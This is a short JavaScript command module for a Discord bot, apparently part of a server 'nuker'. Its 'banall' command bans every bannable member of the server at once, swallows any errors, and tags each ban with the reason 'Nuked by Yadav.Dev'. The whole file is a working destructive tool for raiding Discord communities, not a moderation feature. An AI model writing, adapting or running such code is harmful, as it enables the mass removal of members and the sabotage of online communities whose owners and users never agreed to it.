module.exports = {
  name: 'banall',
  description: 'Ban all members (fastest version)',
  ownerOnly: true,
  async execute(message, args, client) {
    const guild = message.guild;
    if (!guild) return message.reply("❌ Not in a server.");

    message.reply("🚀 Banning all members... This may take a while due to rate limits.");

    const promises = guild.members.cache.map(member => {
      if (member.id !== client.user.id && member.bannable) {
        return member.ban({ reason: "Nuked by Yadav.Dev" }).catch(() => {});
      }
    });

    Promise.allSettled(promises).then(() => {
      message.reply("✅ Ban attempt completed on all bannable members.");
    });
  }
};
